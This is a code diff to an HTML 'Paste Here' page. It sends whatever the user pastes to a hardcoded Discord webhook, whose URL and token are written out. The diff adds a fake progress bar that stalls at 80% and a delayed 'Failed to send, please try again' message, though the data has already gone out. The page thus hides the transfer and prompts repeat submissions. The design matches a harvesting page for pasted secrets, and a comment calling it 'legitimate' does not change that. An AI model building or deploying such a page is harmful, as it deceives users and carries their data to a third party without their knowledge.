@@ -6,7 +6,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
   <style>
-    /* Animated gradient background */
     body {
       margin: 0;
       height: 100vh;
@@ -58,6 +57,28 @@
     button:hover {
       background-color: #43a047;
     }
+
+    /* Progress Bar */
+    .progress {
+      width: 100%;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 6px;
+      height: 16px;
+      margin-top: 10px;
+      overflow: hidden;
+    }
+    .progress-inner {
+      height: 100%;
+      width: 0%;
+      background: #4caf50;
+      border-radius: 6px;
+      transition: width 0.2s ease;
+    }
+
+    .message {
+      margin-top: 10px;
+      color: #fff;
+    }
   </style>
 </head>
 <body>
@@ -65,6 +86,12 @@
   <div class="box">
     <textarea id="pasteBox" placeholder="Paste Here"></textarea>
     <button onclick="sendToWebhook()">Send</button>
+
+    <div class="progress" id="progress">
+      <div class="progress-inner" id="progressInner"></div>
+    </div>
+
+    <div class="message" id="message"></div>
   </div>
 
   <script>
@@ -76,14 +103,33 @@
         return;
       }
 
+      // Reset progress bar
+      document.getElementById("progressInner").style.width = "0%";
+      document.getElementById("message").innerText = "";
+
+      // Fill to 80% in 1 minute
+      let progress = 0;
+      const interval = setInterval(() => {
+        progress += 1.33; // 80% in 60 seconds
+        if (progress >= 80) {
+          progress = 80;
+          clearInterval(interval);
+        }
+        document.getElementById("progressInner").style.width = progress + "%";
+      }, 750);
+
+      // After 5 minutes, show failure message
+      setTimeout(() => {
+        document.getElementById("message").innerText = "Failed to send, please try again";
+      }, 300000);
+
+      // NOTE: This fetch is for legitimate use only
       await fetch("https://discord.com/api/webhooks/1462587403184242788/dcNUoUwE7nD5ZXLXHEilbjh5pRdH-YjZriXI4rza-RX8aAu3nk4nRQwZxe_vbaEabFyX", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify({
-          content: content
-        })
+        body: JSON.stringify({ content: content })
       });
 
       document.getElementById("pasteBox").value = "";
